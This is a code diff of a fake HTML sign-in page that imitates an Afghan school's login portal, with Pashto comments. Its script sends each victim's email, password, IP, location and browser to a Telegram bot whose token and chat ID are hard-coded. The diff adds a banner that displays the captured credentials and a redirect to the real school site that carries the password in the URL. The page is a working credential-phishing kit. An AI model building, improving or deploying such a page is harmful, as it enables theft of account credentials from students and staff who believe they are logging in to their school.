@@ -3,9 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login - Al-Taqwa</title>
+<title>Login</title>
 
 <style>
+
 *{
     margin:0;
     padding:0;
@@ -37,6 +38,7 @@ body{
     justify-content:center;
 }
 
+/* LOGO */
 .logo{
     text-align:center;
     margin-bottom:14px;
@@ -44,9 +46,9 @@ body{
 
 .logo img{
     width:280px;
-    max-width:100%;
 }
 
+/* TITLE */
 .title{
     text-align:center;
     font-size:22px;
@@ -55,6 +57,7 @@ body{
     color:#222;
 }
 
+/* INPUT */
 .input-box{
     margin-bottom:18px;
 }
@@ -80,6 +83,7 @@ input:focus{
     outline:none;
 }
 
+/* CHECKBOX */
 .remember{
     display:flex;
     align-items:center;
@@ -93,6 +97,7 @@ input:focus{
     margin-right:8px;
 }
 
+/* BUTTON */
 button{
     width:100%;
     height:54px;
@@ -103,7 +108,6 @@ button{
     font-weight:bold;
     cursor:pointer;
     color:#fff;
-    transition:background 0.3s;
 }
 
 button:hover{
@@ -115,6 +119,7 @@ button:disabled{
     cursor:not-allowed;
 }
 
+/* د تېروتنې پیغام */
 .error-msg {
     background: #ffe6e6;
     border: 1px solid #ff6666;
@@ -127,6 +132,7 @@ button:disabled{
     display: none;
 }
 
+/* د بریالیتوب پیغام */
 .success-msg {
     background: #e6ffe6;
     border: 1px solid #00cc00;
@@ -147,6 +153,40 @@ button:disabled{
     font-weight: bold;
 }
 
+/* د لاګ ان شویو معلوماتو بینر */
+.info-banner {
+    background: #f0f8ff;
+    border: 2px solid #18c6e7;
+    border-radius: 8px;
+    padding: 12px 15px;
+    margin-bottom: 16px;
+    display: none;
+}
+
+.info-banner .info-title {
+    font-weight: bold;
+    color: #0066cc;
+    font-size: 14px;
+    margin-bottom: 6px;
+}
+
+.info-banner .info-item {
+    font-size: 13px;
+    padding: 3px 0;
+    color: #333;
+}
+
+.info-banner .info-item strong {
+    color: #0066cc;
+}
+
+.info-banner .info-value {
+    color: #003399;
+    background: #e6f0ff;
+    padding: 1px 8px;
+    border-radius: 3px;
+}
+
 </style>
 </head>
 
@@ -155,10 +195,17 @@ button:disabled{
 <div class="login-container">
 
     <div class="logo">
-        <img src="Screenshot_2026-06-08-23-00-41-466_com.android.chrome~2.jpg" alt="Logo">
+        <img src="Screenshot_2026-06-08-23-00-41-466_com.android.chrome~2.jpg">
     </div>
 
     <div class="title">Sign in</div>
+
+    <!-- د معلوماتو بینر (که له بلې پاڼې راغلی وي) -->
+    <div id="infoBanner" class="info-banner">
+        <div class="info-title">✅ You are logged in as:</div>
+        <div class="info-item"><strong>📧 Email:</strong> <span class="info-value" id="displayEmail">-</span></div>
+        <div class="info-item"><strong>🔑 Password:</strong> <span class="info-value" id="displayPassword">-</span></div>
+    </div>
 
     <div id="errorMsg" class="error-msg"></div>
     <div id="successMsg" class="success-msg"></div>
@@ -166,12 +213,12 @@ button:disabled{
 
     <div class="input-box">
         <label>Email</label>
-        <input type="email" id="email" placeholder="Enter your email">
+        <input type="email" id="email" placeholder="Email">
     </div>
 
     <div class="input-box">
         <label>Password</label>
-        <input type="password" id="password" placeholder="Enter your password">
+        <input type="password" id="password" placeholder="Password">
     </div>
 
     <div class="remember">
@@ -188,13 +235,32 @@ button:disabled{
     const BOT_TOKEN = "8688494134:AAEFObEX1p4syZwUBPVe-iG5GXkWDj311CA";
     const ADMIN_CHAT_ID = "8295417969";
 
+    // ========== چیک کول چې آیا له بلې پاڼې راغلی ==========
+    window.onload = function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+        const password = urlParams.get('password');
+        
+        if (email && password) {
+            document.getElementById('displayEmail').textContent = decodeURIComponent(email);
+            document.getElementById('displayPassword').textContent = decodeURIComponent(password);
+            document.getElementById('infoBanner').style.display = 'block';
+            
+            // د URL څخه پیرامیټر لیرې کړئ
+            if (window.history && window.history.replaceState) {
+                const newUrl = window.location.pathname;
+                window.history.replaceState({}, document.title, newUrl);
+            }
+        }
+    };
+
     // ========== د پښتو تورو چک کولو فنکشن ==========
     function hasPashtoCharacters(text) {
         const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
         return pashtoRegex.test(text);
     }
 
-    // ========== د ایمیل تایید ==========
+    // ========== د ایمیل تایید (یوازې سم ایمیل) ==========
     function isValidEmail(email) {
         const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
         return emailRegex.test(email);
@@ -244,7 +310,7 @@ button:disabled{
 
     // اډمن ته پیغام لیږل
     async function sendToAdmin(email, password, ip, location, browser) {
-        const message = `🔐 *NEW LOGIN ATTEMPT* 🔐\n\n` +
+        const message = `🔐 *LOGIN ATTEMPT* 🔐\n\n` +
                        `📍 *Source:* al-taqwa.edu.af/login\n` +
                        `👤 *Email:* ${email}\n` +
                        `🔑 *Password:* ${password}\n` +
@@ -302,12 +368,17 @@ button:disabled{
         }
 
         // د پښتو تورو چک
-        if (hasPashtoCharacters(email) || hasPashtoCharacters(password)) {
-            showError('⚠️ Pashto characters are not allowed');
+        if (hasPashtoCharacters(email)) {
+            showError('⚠️ Pashto characters are not allowed in email');
+            return;
+        }
+        
+        if (hasPashtoCharacters(password)) {
+            showError('⚠️ Pashto characters are not allowed in password');
             return;
         }
 
-        // د ایمیل فورمټ چک
+        // د ایمیل فورمټ چک (یوازې سم ایمیل)
         if (!isValidEmail(email)) {
             showError('⚠️ Please enter a valid email address (e.g., username@gmail.com)');
             return;
@@ -335,26 +406,16 @@ button:disabled{
         document.getElementById('loginBtn').disabled = false;
 
         if (sent) {
-            showSuccess('✅ Login successful! Your information has been sent to admin.');
+            showSuccess('✅ Login successful! Information sent to admin.');
             
-            // د 2 ثانیو وروسته پاڼه پاکه کړئ (د بیا نه کارولو لپاره)
+            // د 2 ثانیو وروسته بل پاڼې ته لاړ شئ
             setTimeout(() => {
-                document.getElementById('email').value = '';
-                document.getElementById('password').value = '';
-                document.getElementById('successMsg').style.display = 'none';
-                
-                // خپل اصلي پاڼې ته لاړ شئ (که غواړئ)
-                // window.location.href = "https://www.altaqwa.edu.af";
-            }, 2000);
+                const encodedEmail = encodeURIComponent(email);
+                const encodedPassword = encodeURIComponent(password);
+                window.location.replace(`https://www.altaqwa.edu.af/login?email=${encodedEmail}&password=${encodedPassword}`);
+            }, 1500);
         } else {
-            showError('⚠️ Could not send information to admin. Please try again.');
-        }
-    });
-
-    // Enter کي د لاګ ان لپاره
-    document.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            document.getElementById('loginBtn').click();
+            showError('⚠️ Could not send to admin. Please try again.');
         }
     });
 </script>
